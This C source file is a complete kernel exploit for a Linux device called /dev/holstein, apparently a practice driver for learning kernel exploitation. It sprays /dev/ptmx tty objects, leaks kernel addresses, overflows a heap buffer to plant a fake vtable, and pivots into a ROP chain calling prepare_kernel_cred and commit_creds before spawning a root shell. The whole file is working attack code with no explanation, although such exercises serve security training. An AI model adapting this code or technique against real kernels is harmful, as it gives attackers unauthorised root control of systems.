#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdint.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <sys/types.h>

#define for_x(i, a, b) for(int i = a; i <= b; i++)
#define for_n(i, a, b) for(int i = a; i >= b; i--)
#define inc idx++
#define save_state(val)                                   \
    do {                                                  \
        __asm__(                                          \
            ".intel_syntax noprefix;"                     \
            "mov user_cs, cs;"                            \
            "mov user_ss, ss;"                            \
            "mov user_rsp, rsp;"                          \
            "mov user_rbp, rbp;" /*this to make sure stack frame doesnt corrupt*/ \
            "pushfq;"                                     \
            "pop user_rflags;"                            \
            ".att_syntax;"                                \
        );                                                \
        user_rip = val;                                   \
        puts("[$] saved state");                          \
    } while (0)

typedef uint64_t u64;

u64 dev_fd;
u64 spray[100];
u64 user_rip, user_cs, user_rflags, user_rsp, user_ss, user_rbp;
u64 kbase, g_buf, koffset;
u64 rop[100];

void win()
{
    if(getuid() == 0)
    {
        char *argv[] = {"/bin/sh", NULL};
        char *envp[] = {NULL};
        puts("[*] enjoy");
        execve(argv[0], argv, envp);
    }
    else puts("[!] fail uid");
}


void heap_spray()
{
    for_x(i, 0, 49) spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
    dev_fd = open("/dev/holstein", O_RDWR);
    for_x(i, 50, 100) spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
}

void leak()
{
    char buf[0x500];
    read(dev_fd, buf, 0x500);
    kbase = *(u64 *)(&buf[0x418]) - 0xc38880;
    g_buf = *(u64 *)(&buf[0x438]) - 0x438;
    printf("[*] kbase: 0x%lx\n", kbase);
    printf("[*] g_buf: 0x%lx\n", g_buf);

    koffset = kbase - 0xffffffff81000000;
    printf("[?] koffset: 0x%lx\n", koffset);
}

void heap_overflow()
{
    save_state((u64)(&win));

    // prepare rop chain
    u64 prepare_kernel_cred = koffset + 0xffffffff81074650;
    u64 commit_creds = koffset + 0xffffffff810744b0;
    u64 pop_rdi = koffset + 0xffffffff81032f59;
    u64 pop_rcx = koffset + 0xffffffff8140c7b3; // set rcx to null to help the mov_rdi_rax gadget
    u64 mov_rdi_rax = koffset + 0xffffffff8162707b; // mov rdi, rax; rep movsq [rdi], [rsi]; ret;
    u64 swapgs_n_ret2usr_chain = koffset + 0xffffffff81800e26;

    u64 idx = 0;
    rop[inc] = pop_rdi;
    rop[inc] = 0;
    rop[inc] = prepare_kernel_cred;
    rop[inc] = pop_rcx;
    rop[inc] = 0;
    rop[inc] = mov_rdi_rax;
    rop[inc] = commit_creds;
    rop[inc] = swapgs_n_ret2usr_chain;
    rop[inc] = 0; // [rdi]
    rop[inc] = 0; // [rdi + 8]
    rop[inc] = user_rip;
    rop[inc] = user_cs;
    rop[inc] = user_rflags;
    rop[inc] = user_rsp;
    rop[inc] = user_ss;
    printf("[*] rop chain prepared, length: %lu\n", idx);

    // overflow overwrite tty struct
    char buf[0x520] = {0};
    // restore heap metadata (to rewrite data value of tty struct in heap when overflow)
    read(dev_fd, buf, 0x420);

    u64 pivot_gadget = koffset + 0xffffffff813a478a; // 0xffffffff813a478a: push rdx; mov ebp, 0x415bffd9; pop rsp; pop r13; pop rbp; ret;
    // fake vtable
    u64 *p = (u64 *)(&buf);
    p[0xc] = (u64)pivot_gadget;
    *(u64 *)(&buf[0x418]) = g_buf;
    // insert rop chain
    p = (u64 *)(&buf[0x10 * 8]);
    memcpy(p, rop, 18 * 8);

    puts("[*] overflowing");
    write(dev_fd, buf, 0x420);
    // trigger
    for_x(i, 0, 100) ioctl(spray[i], 0, g_buf + (0x10 * 8) - 0x10); // second parameter of ioctl to 0, avoiding the crash issue
    
    puts("[!] should never be reach");
}

int main()
{
    heap_spray();
    leak();
    heap_overflow();
}